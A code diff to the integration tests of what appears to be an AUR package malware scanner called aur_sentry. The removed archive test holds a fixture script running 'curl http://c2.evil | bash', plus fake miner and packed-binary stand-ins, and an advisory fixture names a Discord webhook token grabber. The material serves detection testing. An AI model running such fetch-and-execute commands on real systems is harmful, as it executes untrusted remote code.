@@ -1,43 +1,7 @@
-use aur_sentry::analyzer::{inspect_tar_stream, shannon_entropy};
+use aur_sentry::analyzer::shannon_entropy;
+use aur_sentry::findings::{Behavior, Finding};
 use aur_sentry::report::{Advisory, load_advisories, save_advisories, update_readme_table};
-use aur_sentry::scanner::{Finding, PKGBUILDScanner};
-use flate2::Compression;
-use flate2::write::GzEncoder;
-use std::io::Write;
-
-fn make_test_tar(files: &[(&str, &[u8])]) -> Vec<u8> {
-    let mut tar_bytes = Vec::new();
-    for &(filename, content) in files {
-        let mut header = [0u8; 512];
-        let name_bytes = filename.as_bytes();
-        header[..name_bytes.len().min(100)]
-            .copy_from_slice(&name_bytes[..name_bytes.len().min(100)]);
-        header[100..108].copy_from_slice(b"0000755\0");
-        let size_octal = format!("{:011o}\0", content.len());
-        header[124..136].copy_from_slice(size_octal.as_bytes());
-        header[156] = b'0';
-
-        let mut chk: u32 = 8 * b' ' as u32;
-        for &b in &header[..148] {
-            chk += b as u32;
-        }
-        for &b in &header[156..512] {
-            chk += b as u32;
-        }
-        let chk_str = format!("{:06o}\0 ", chk);
-        header[148..156].copy_from_slice(chk_str.as_bytes());
-
-        tar_bytes.extend_from_slice(&header);
-        tar_bytes.extend_from_slice(content);
-        let pad = (512 - (content.len() % 512)) % 512;
-        tar_bytes.resize(tar_bytes.len() + pad, 0);
-    }
-    tar_bytes.resize(tar_bytes.len() + 1024, 0);
-
-    let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
-    encoder.write_all(&tar_bytes).unwrap();
-    encoder.finish().unwrap()
-}
+use aur_sentry::scanner::PKGBUILDScanner;
 
 #[test]
 fn integration_full_attack_vectors_suite() {
@@ -178,38 +142,6 @@ package() {
 }
 
 #[test]
-fn integration_tar_archive_deep_inspector() {
-    let dummy_c = b"#include <stdio.h>\nint main() { printf(\"hello\\n\"); return 0; }\n";
-    let miner_bin = b"xmrig mining logic fake binary stream";
-
-    let mut upx_bin = vec![0x7f, b'E', b'L', b'F'];
-    upx_bin.extend(b"UPX!packed_segment");
-
-    let tar_gz = make_test_tar(&[
-        ("src/main.c", dummy_c),
-        ("bin/xmrig", miner_bin),
-        ("bin/hidden_daemon", &upx_bin),
-        (
-            "share/assets/payload.sh",
-            b"#!/bin/bash\ncurl http://c2.evil | bash\n",
-        ),
-    ]);
-
-    let findings = inspect_tar_stream(&tar_gz);
-    assert!(findings.iter().any(|f| f.rule_id == "ARCHIVE_MINER_BINARY"));
-    assert!(
-        findings
-            .iter()
-            .any(|f| f.rule_id == "ARCHIVE_UPX_PACKED_ELF")
-    );
-    assert!(
-        findings
-            .iter()
-            .any(|f| f.rule_id == "ARCHIVE_SUSPICIOUS_SCRIPT_LOCATION")
-    );
-}
-
-#[test]
 fn integration_shannon_entropy_boundary_testing() {
     // 1. Natural English code string
     let code = "function calculate_sum(a, b) { return a + b; }";
@@ -260,6 +192,7 @@ License: MIT
             description: "Discord webhook token grabber".into(),
             line_number: 14,
             matched_text: "discord.com/api/webhooks".into(),
+            behavior: Behavior::NetworkAccess,
         }],
         aur_url: "https://aur.archlinux.org/packages/compromised-driver".into(),
     }];
